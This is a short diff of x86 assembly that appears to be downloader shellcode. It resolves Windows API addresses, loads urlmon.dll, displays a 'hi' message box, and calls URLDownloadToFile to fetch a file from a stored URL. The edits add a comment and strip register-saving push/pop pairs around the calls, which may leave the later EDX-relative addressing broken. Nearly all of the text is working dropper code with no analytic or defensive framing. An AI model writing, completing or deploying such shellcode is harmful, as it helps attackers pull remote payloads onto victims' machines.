@@ -47,6 +47,7 @@ call get_api_address
 pop edx
 pop ebp
 
+; Call LoadLibraryA to get urlmon.dll into memory
 push ebp
 push edx
 lea eax, [EDX + URLMON]
@@ -66,8 +67,6 @@ pop edx
 pop ebp
 
 ; call messageboxa
-push ebp
-push edx
 push 0x00 ; null byte for hi
 push 0x6948 ; hi
 mov eax, esp ; mov pointer to eax
@@ -76,12 +75,10 @@ push 0x00 ; push lpcaption
 push eax ; push lptext
 push 0x00 ; push hwnd
 call [EDX + MESSAGEBOXA]
-pop edx
-pop ebp
+
 
 ; call URLDownloadToFile
-push ebp
-push edx
+
 lea esi, [EDX + URL]
 lea edi, [EDX + URLFILENAME]
 push 0x00 ; push pcaller
@@ -90,8 +87,6 @@ push edi ; push szFileName
 push 0x00 ; Reserver, must be 0
 push 0x00 ; push lpbindstatuscallback
 call [EDX + URLDOWNLOADTOFILE]
-pop edx
-pop ebp
 
 
 
